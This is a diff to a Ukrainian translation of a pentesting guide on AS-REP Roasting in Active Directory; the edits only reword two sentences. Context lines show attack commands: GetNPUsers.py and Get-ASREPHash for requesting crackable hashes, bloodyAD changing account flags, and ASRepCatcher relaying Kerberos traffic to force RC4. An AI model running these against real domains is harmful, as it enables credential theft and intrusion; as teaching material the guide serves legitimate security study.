@@ -33,7 +33,7 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting з Rubeus створить 4768 з типом шифрування 0x17 та типом попередньої автентифікації 0.
+> AS-REP Roasting з Rubeus згенерує 4768 з типом шифрування 0x17 та типом попередньої автентифікації 0.
 
 ### Злом
 ```bash
@@ -53,7 +53,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ## ASREProast без облікових даних
 
 Зловмисник може використовувати позицію "людина посередині", щоб захопити пакети AS-REP під час їх проходження через мережу, не покладаючись на відключення попередньої автентифікації Kerberos. Тому це працює для всіх користувачів у VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє нам це зробити. Більше того, інструмент змушує робочі станції клієнтів використовувати RC4, змінюючи переговори Kerberos.
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє нам це зробити. Більше того, інструмент змушує клієнтські робочі станції використовувати RC4, змінюючи переговори Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
